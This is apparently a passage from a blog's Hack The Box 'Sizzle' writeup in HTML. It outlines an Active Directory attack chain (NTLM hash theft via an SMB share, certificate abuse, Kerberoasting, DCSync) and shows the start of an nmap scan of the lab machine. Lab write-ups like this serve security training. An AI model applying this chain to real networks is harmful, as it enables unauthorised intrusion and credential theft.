@@ -1,0 +1,1223 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.5991d603939a6d188be342b278a4555db90f163903158c623d2c39fde3d82cb3.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">pL4StiC - HtB Sizzle</title>
+<meta property="og:title" content=pL4StiC&#32;-&#32;HtB&#32;Sizzle />
+<meta name="twitter:title" content=pL4StiC&#32;-&#32;HtB&#32;Sizzle />
+<meta itemprop="name" content=pL4StiC&#32;-&#32;HtB&#32;Sizzle />
+<meta name="application-name" content=pL4StiC&#32;-&#32;HtB&#32;Sizzle />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+
+<base href="https://pL4sTiC1337.github.io/writeups/htb-sizzle/" />
+<link rel="canonical" href="https://pL4sTiC1337.github.io/writeups/htb-sizzle/" itemprop="url" />
+<meta name="url" content="https://pL4sTiC1337.github.io/writeups/htb-sizzle/" />
+<meta name="twitter:url" content="https://pL4sTiC1337.github.io/writeups/htb-sizzle/" />
+<meta property="og:url" content="https://pL4sTiC1337.github.io/writeups/htb-sizzle/" />
+
+
+<meta property="og:updated_time" content="2025-02-28T22:59:51-05:00" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='https://pL4sTiC1337.github.io/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+
+  
+    <meta name="twitter:site" content="@pL4sTiC1337" />
+    <meta name="twitter:creator" content="@pL4sTiC1337" />
+
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.145.0">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.cca58c146f4edc10af613962d5043d66deb02f90a09c9f14c98adf9418774835.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="https://pL4sTiC1337.github.io/">
+                <img src="/images/pl4stic.png" alt="brand image">
+            </a>
+        
+        
+            <a href="https://pL4sTiC1337.github.io/">
+                <h1>pL4StiC</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    My Ramblings...
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/posts/">Posts</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            Recent
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/posts/dark-side-of-wifi/">The Dark Side of WiFi</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/posts/the-age-of-uts/">The Age of Ubiquitous Surveillance</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/posts/the-rfid-badge-capture/">The RFID Badge Capture</a>
+                            </li>
+                        
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/writeups/">Writeups</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            Recent
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/writeups/htb-sizzle/">HtB Sizzle</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/writeups/htb-vault/">HtB Vault</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/writeups/htb-popcorn/">HtB Popcorn</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/writeups/htb-sightless/">Htb Sightless</a>
+                            </li>
+                        
+                            <li class="bullet">
+                                <a href="https://pL4sTiC1337.github.io/writeups/htb-cicada/">HtB Cicada</a>
+                            </li>
+                        
+                    
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                            <li class="heading">
+                                <a href="/writeups/">Writeups</a>
+                            </li>
+                            
+                            <li class="sub-heading">
+                                Recent
+                            </li>
+                            
+                                <li class="bullet">
+                                    <a href="https://pL4sTiC1337.github.io/writeups/htb-vault/">HtB Vault</a>
+                                </li>
+                            
+                        
+                    
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/pL4sTiC1337">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+
+
+    <a target="_blank" class="social" title="X" href="https://x.com/pL4sTiC1337">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.1em" height="1.1em" viewBox="0 0 512 472.799">
+            <path fill="currentColor" d="M403.229 0h78.506L310.219 196.04 512 462.799H354.002L230.261 301.007 88.669 462.799h-78.56l183.455-209.683L0 0h161.999l111.856 147.88L403.229 0zm-27.556 415.805h43.505L138.363 44.527h-46.68l283.99 371.278z"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="TryHackMe" href="https://tryhackme.com/r/p/pL4sTiC">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24" >
+            <path fill="white" d="M10.705 0C7.54 0 4.902 2.285 4.349 5.291a4.525 4.525 0 0 0-4.107 4.5 4.525 4.525 0 0 0 4.52 4.52h6.761a.625.625 0 1 0 0-1.25H4.761a3.273 3.273 0 0 1-3.27-3.27A3.273 3.273 0 0 1 6.59 7.08a.625.625 0 0 0 .7-1.035 4.488 4.488 0 0 0-1.68-.69 5.223 5.223 0 0 1 5.096-4.104 5.221 5.221 0 0 1 5.174 4.57 4.489 4.489 0 0 0-.488.305.625.625 0 1 0 .731 1.013 3.245 3.245 0 0 1 1.912-.616 3.278 3.278 0 0 1 3.203 2.61.625.625 0 0 0 1.225-.251 4.533 4.533 0 0 0-4.428-3.61 4.54 4.54 0 0 0-.958.105C16.556 2.328 13.9 0 10.705 0zm5.192 10.64a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.054.514c0 .181.018.353.054.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .309-.296c.08-.124.137-.267.173-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.309-.291.917.917 0 0 0-.46-.108zm6.486 0a.925.925 0 0 0-.462.108.913.913 0 0 0-.313.29 1.27 1.27 0 0 0-.175.427 2.39 2.39 0 0 0-.053.514c0 .181.017.353.053.517.036.164.095.307.175.43a.899.899 0 0 0 .313.297c.127.073.281.11.462.11.18 0 .334-.037.46-.11a.897.897 0 0 0 .31-.296c.078-.124.136-.267.172-.431.036-.164.054-.336.054-.517 0-.18-.018-.352-.054-.514a1.271 1.271 0 0 0-.173-.426.901.901 0 0 0-.308-.291.916.916 0 0 0-.461-.108zm-8.537.068l-.84.618.313.43.476-.368v1.877h.603v-2.557zm6.486 0l-.841.618.314.43.477-.368v1.877h.603v-2.557zm-4.435.445c.08 0 .143.028.193.084.05.057.087.127.114.21.026.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.028.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.248.248 0 0 1-.195-.086.584.584 0 0 1-.118-.209 1.245 1.245 0 0 1-.056-.27 2.645 2.645 0 0 1 0-.533c.01-.096.029-.186.056-.27a.583.583 0 0 1 .118-.209.25.25 0 0 1 .195-.084zm6.486 0c.08 0 .144.028.193.084.05.057.087.127.114.21.027.083.044.173.054.269a2.541 2.541 0 0 1 0 .533c-.01.097-.027.187-.054.27a.584.584 0 0 1-.114.21.243.243 0 0 1-.193.085.249.249 0 0 1-.195-.086.581.581 0 0 1-.117-.209 1.245 1.245 0 0 1-.056-.27 2.642 2.642 0 0 1 0-.533c.01-.096.028-.186.056-.27a.58.58 0 0 1 .117-.209.25.25 0 0 1 .195-.084zm-2.191 3.51a.93.93 0 0 0-.463.109.908.908 0 0 0-.312.291c-.08.122-.139.263-.175.426a2.383 2.383 0 0 0-.054.514c0 .18.018.353.054.516.036.164.094.308.175.432a.91.91 0 0 0 .312.296.92.92 0 0 0 .463.11c.18 0 .333-.037.46-.11a.892.892 0 0 0 .308-.296 1.32 1.32 0 0 0 .174-.432c.036-.163.054-.335.054-.516 0-.18-.018-.352-.054-.514a1.274 1.274 0 0 0-.174-.426.89.89 0 0 0-.309-.291.918.918 0 0 0-.46-.108zm-6.402.07l-.841.617.314.43.476-.369v1.878h.604v-2.557zm2.125 0l-.841.617.314.43.477-.369v1.878h.603v-2.557zm2.116 0l-.84.617.313.43.477-.369v1.878h.603v-2.557zm2.16.443c.08 0 .144.028.194.085a.605.605 0 0 1 .114.21c.026.083.044.172.053.269a2.639 2.639 0 0 1 0 .532 1.28 1.28 0 0 1-.053.27.585.585 0 0 1-.114.21.244.244 0 0 1-.193.085.25.25 0 0 1-.196-.085.589.589 0 0 1-.117-.21 1.245 1.245 0 0 1-.056-.27 2.597 2.597 0 0 1 0-.532c.01-.097.028-.186.056-.27a.589.589 0 0 1 .117-.209.249.249 0 0 1 .196-.085zm-6.729 3.073a.676.676 0 0 0-.335.078.661.661 0 0 0-.227.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.93.93 0 0 0 .127.313.65.65 0 0 0 .227.215c.092.053.204.08.335.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .225-.215c.057-.09.1-.194.125-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.931.931 0 0 0-.125-.31.658.658 0 0 0-.225-.21.667.667 0 0 0-.334-.08zm3.086 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.907.907 0 0 0-.127.31 1.69 1.69 0 0 0-.04.373c0 .131.013.256.04.375a.928.928 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08a.655.655 0 0 0 .334-.08.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.752 1.752 0 0 0 0-.748.94.94 0 0 0-.126-.31.657.657 0 0 0-.224-.21.667.667 0 0 0-.334-.08zm5.108 0a.675.675 0 0 0-.336.078.661.661 0 0 0-.226.211.91.91 0 0 0-.127.31c-.027.118-.04.242-.04.373s.013.256.04.375a.931.931 0 0 0 .127.313c.058.09.134.162.226.215.093.053.205.08.336.08.13 0 .243-.027.334-.08a.65.65 0 0 0 .224-.215c.058-.09.1-.194.126-.313a1.75 1.75 0 0 0 .04-.375c0-.13-.014-.255-.04-.373a.943.943 0 0 0-.126-.31.657.657 0 0 0-.224-.21.668.668 0 0 0-.334-.08zm-6.658.05l-.61.448.227.311.346-.266v1.362h.438v-1.856zm3.068 0l-.61.448.227.311.346-.266v1.362h.438v-1.856zm5.108 0l-.611.448.228.311.346-.266v1.362h.438v-1.856zm-9.712.322c.058 0 .105.02.14.062a.421.421 0 0 1 .083.151.96.96 0 0 1 .04.196 1.932 1.932 0 0 1 0 .386.954.954 0 0 1-.04.197.421.421 0 0 1-.083.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.427.427 0 0 1-.085-.153.887.887 0 0 1-.041-.197 1.96 1.96 0 0 1 0-.386.893.893 0 0 1 .04-.196.42.42 0 0 1 .086-.151.181.181 0 0 1 .141-.062zm3.086 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.94.94 0 0 1 .04.196 1.906 1.906 0 0 1 0 .386.93.93 0 0 1-.04.197.421.421 0 0 1-.082.152.176.176 0 0 1-.14.061.18.18 0 0 1-.141-.06.42.42 0 0 1-.086-.153.846.846 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.849.849 0 0 1 .041-.196.42.42 0 0 1 .086-.151.182.182 0 0 1 .141-.062zm5.108 0c.058 0 .104.02.14.062a.421.421 0 0 1 .082.151.92.92 0 0 1 .04.196 1.963 1.963 0 0 1 0 .386.943.943 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.061.18.18 0 0 1-.142-.06.437.437 0 0 1-.085-.153.95.95 0 0 1-.04-.197 1.965 1.965 0 0 1-.011-.195c0-.057.004-.121.01-.191a.959.959 0 0 1 .04-.196.47.47 0 0 1 .086-.151.181.181 0 0 1 .142-.062zm-1.684 1.814a.675.675 0 0 0-.336.079.66.66 0 0 0-.227.21.91.91 0 0 0-.127.31 1.731 1.731 0 0 0 0 .748.939.939 0 0 0 .127.314c.059.09.134.162.227.215.093.053.205.08.336.08a.66.66 0 0 0 .334-.08.648.648 0 0 0 .224-.215c.058-.09.1-.195.126-.314a1.737 1.737 0 0 0-.001-.747.928.928 0 0 0-.125-.31.65.65 0 0 0-.224-.211.668.668 0 0 0-.334-.079zm3.063 0a.676.676 0 0 0-.336.079.664.664 0 0 0-.227.21.906.906 0 0 0-.127.31 1.74 1.74 0 0 0 0 .748.936.936 0 0 0 .127.314.66.66 0 0 0 .227.215c.092.053.204.08.336.08a.654.654 0 0 0 .334-.08.648.648 0 0 0 .223-.215c.058-.09.1-.195.126-.314a1.74 1.74 0 0 0 0-.747.928.928 0 0 0-.126-.31.65.65 0 0 0-.223-.211.666.666 0 0 0-.334-.079zm-1.545.05l-.611.448.228.312.346-.267v1.363h.438v-1.856zm-1.518.323c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.91.91 0 0 1 .04.195 1.966 1.966 0 0 1 0 .387.951.951 0 0 1-.04.197.421.421 0 0 1-.082.152.177.177 0 0 1-.14.06.18.18 0 0 1-.142-.06.428.428 0 0 1-.085-.152.914.914 0 0 1-.04-.197 1.96 1.96 0 0 1-.011-.195c0-.058.003-.122.01-.192a.923.923 0 0 1 .041-.195c.02-.06.048-.11.085-.152a.181.181 0 0 1 .142-.061zm3.063 0c.057 0 .104.02.14.061a.42.42 0 0 1 .082.152.94.94 0 0 1 .04.195 1.91 1.91 0 0 1 0 .387.93.93 0 0 1-.04.197.422.422 0 0 1-.083.152.175.175 0 0 1-.14.06.18.18 0 0 1-.141-.06.423.423 0 0 1-.085-.152.907.907 0 0 1-.04-.197 1.95 1.95 0 0 1 0-.387.915.915 0 0 1 .04-.195c.02-.06.048-.11.085-.152a.182.182 0 0 1 .142-.061zm-9.713.185a.465.465 0 0 0-.232.055.456.456 0 0 0-.157.146.627.627 0 0 0-.089.215 1.168 1.168 0 0 0-.027.259c0 .09.009.177.027.26a.648.648 0 0 0 .089.216c.04.063.093.112.157.149a.459.459 0 0 0 .232.056c.09 0 .168-.02.231-.056a.45.45 0 0 0 .156-.149.67.67 0 0 0 .087-.217 1.218 1.218 0 0 0 0-.518.647.647 0 0 0-.087-.215.448.448 0 0 0-.156-.146.458.458 0 0 0-.23-.055zm1.052.035l-.423.31.158.217.24-.185v.944h.303v-1.286zm-1.052.224c.04 0 .073.014.097.042a.284.284 0 0 1 .057.105.69.69 0 0 1 .028.136c.004.049.007.092.007.133 0 .04-.003.086-.007.135a.684.684 0 0 1-.028.136.285.285 0 0 1-.057.105.123.123 0 0 1-.097.043.125.125 0 0 1-.098-.043.298.298 0 0 1-.059-.105.612.612 0 0 1-.028-.136 1.39 1.39 0 0 1 0-.268.62.62 0 0 1 .028-.136.297.297 0 0 1 .06-.105.125.125 0 0 1 .097-.042zm3.775 1.394a.463.463 0 0 0-.232.054.452.452 0 0 0-.157.146.621.621 0 0 0-.088.214 1.19 1.19 0 0 0 0 .519.641.641 0 0 0 .088.217.46.46 0 0 0 .157.15.458.458 0 0 0 .232.054.454.454 0 0 0 .232-.055.45.45 0 0 0 .155-.149.664.664 0 0 0 .087-.217 1.189 1.189 0 0 0 0-.519.642.642 0 0 0-.087-.214.446.446 0 0 0-.155-.146.459.459 0 0 0-.232-.054zm1.052.034l-.423.31.158.216.24-.185v.945h.303V22.68zm-1.052.223c.04 0 .073.014.098.043a.3.3 0 0 1 .057.105.643.643 0 0 1 .027.135 1.31 1.31 0 0 1 0 .268.654.654 0 0 1-.027.137.307.307 0 0 1-.057.105.124.124 0 0 1-.098.042.125.125 0 0 1-.098-.042.293.293 0 0 1-.059-.105.618.618 0 0 1-.028-.137 1.364 1.364 0 0 1 0-.268.612.612 0 0 1 .028-.135.287.287 0 0 1 .06-.105.123.123 0 0 1 .097-.043z"></path>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="RSS Feed" href="/index.xml">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
+            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
+                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
+                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
+                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
+            </g>
+        </svg>
+    </a>
+
+
+
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2025 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="https://pL4sTiC1337.github.io/writeups/htb-sizzle/">HtB Sizzle</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      
+      <time datetime=" 2025-02-28T22:59:51-0500" class="post-date">
+        February 28, 2025
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>16 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-writeup">
+        <a href="https://pL4sTiC1337.github.io/tags/writeup">writeup</a>
+      </li>
+      
+      <li class="tag-hack the box">
+        <a href="https://pL4sTiC1337.github.io/tags/hack-the-box">hack the box</a>
+      </li>
+      
+      <li class="tag-insane">
+        <a href="https://pL4sTiC1337.github.io/tags/insane">insane</a>
+      </li>
+      
+      <li class="tag-windows">
+        <a href="https://pL4sTiC1337.github.io/tags/windows">windows</a>
+      </li>
+      
+      <li class="tag-active directory">
+        <a href="https://pL4sTiC1337.github.io/tags/active-directory">active directory</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <p><img src="/images/Sizzle.png" alt="HtB-Sizzle"></p>
+<p>Sizzle is an Insane difficulty WIndows box with an Active Directory environment. A writable directory in an SMB share allows to steal NTLM hashes which can be cracked to access the Certificate Services Portal. A self signed certificate can be created using the CA and used for PSRemoting. A SPN associated with a user allows a kerberoast attack on the box. The user is found to have Replication rights which can be abused to get Administrator hashes via DCSync.</p>
+<hr>
+<h2 id="scanning">Scanning</h2>
+<h3 id="nmap">nmap</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/sizzle<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -T4 -p- -A 10.129.124.103                  
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-25 22:31 EST
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>21/tcp    open  ftp           Microsoft ftpd
+</span></span><span style="display:flex;"><span>|_ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ftp-syst: 
+</span></span><span style="display:flex;"><span>|_  SYST: Windows_NT
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
+</span></span><span style="display:flex;"><span>80/tcp    open  http          Microsoft IIS httpd 10.0
+</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#ae81ff">\&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/10.0
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|   Supported Methods: OPTIONS TRACE GET HEAD POST
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: HTB.LOCAL, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_ssl-date: 2025-02-26T03:37:42+00:00; +1m53s from scanner time.
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>sizzle.HTB.LOCAL
+</span></span><span style="display:flex;"><span>| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:&lt;unsupported&gt;, DNS:sizzle.HTB.LOCAL
